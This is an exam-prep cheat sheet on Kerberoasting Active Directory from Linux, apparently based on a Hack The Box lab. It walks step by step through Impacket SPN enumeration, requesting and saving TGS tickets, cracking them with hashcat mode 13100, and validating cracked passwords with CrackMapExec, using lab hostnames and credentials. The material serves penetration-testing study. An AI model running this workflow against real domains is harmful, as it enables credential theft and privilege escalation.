# Kerberoasting from Linux

## 1. Overview

**Kerberoasting** is an Active Directory attack used to obtain service account credentials by requesting Kerberos TGS tickets and cracking them offline.

- Targets domain accounts associated with **Service Principal Names (SPNs)**.
- Any authenticated domain user can generally request tickets for SPN-associated accounts.
- TGS tickets can be cracked offline using Hashcat or John the Ripper.
- Compromised service accounts may provide opportunities for lateral movement or privilege escalation.

**Requirements:**
- Valid domain credentials or supported authentication material.
- Domain Controller IP address.
- Impacket's `GetUserSPNs.py`.

## 2. Install Impacket

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
sudo python3 -m pip install .
```

View help:

```bash
GetUserSPNs.py -h
```

## 3. Enumerate SPN Accounts

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME>
```

Example:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

**Look for:**
- SPN-associated accounts.
- Privileged group memberships, especially `Domain Admins`.
- Interesting service accounts, such as SQL Server accounts.

## 4. Request TGS Tickets

### Request Tickets for All SPN Accounts

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request
```

### Request a Specific User's Ticket

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_USER>
```

### Save the Ticket to a File

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_USER> -outputfile <FILE>
```

Example:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

## 5. Crack the Ticket with Hashcat

```bash
hashcat -m 13100 <TICKET_FILE> <WORDLIST>
```

Example:

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

**Important:**
- Hashcat mode `13100` targets Kerberos 5 TGS-REP etype 23.
- Successful ticket extraction does not guarantee password recovery.
- Cracking success depends on password strength and the available wordlist.

## 6. Validate Recovered Credentials

The original HTB example uses CrackMapExec:

```bash
crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>'
```

Example:

```bash
crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'
```

After successful authentication, enumerate the account's actual privileges and accessible services.

> **Note:** A cracked password does not automatically mean Domain Admin access.

## 7. Attack Workflow

```text
Enumerate SPNs
     ↓
Identify Interesting Accounts
     ↓
Request TGS Tickets
     ↓
Save Tickets to a File
     ↓
Crack Offline with Hashcat
     ↓
Validate Credentials
     ↓
Check Privileges
     ↓
Potential Lateral Movement / Privilege Escalation
```

## 8. CPTS Exam Quick Reference

| Option | Purpose |
|---|---|
| `-dc-ip` | Specify Domain Controller IP |
| `-request` | Request tickets for discovered SPN accounts |
| `-request-user` | Target a specific account |
| `-outputfile` | Save ticket material |
| `-m 13100` | Hashcat mode for Kerberos TGS-REP etype 23 |

### Key Takeaways

- **SPN enumeration:** `GetUserSPNs.py`
- **Ticket extraction:** `-request`
- **Target one account:** `-request-user`
- **Save ticket:** `-outputfile`
- **Crack ticket:** `hashcat -m 13100`
- **Final step:** Validate credentials and enumerate privileges.

**Remember:** Kerberoasting can enable privilege escalation when a service account's password is recovered and the account has sufficient privileges.
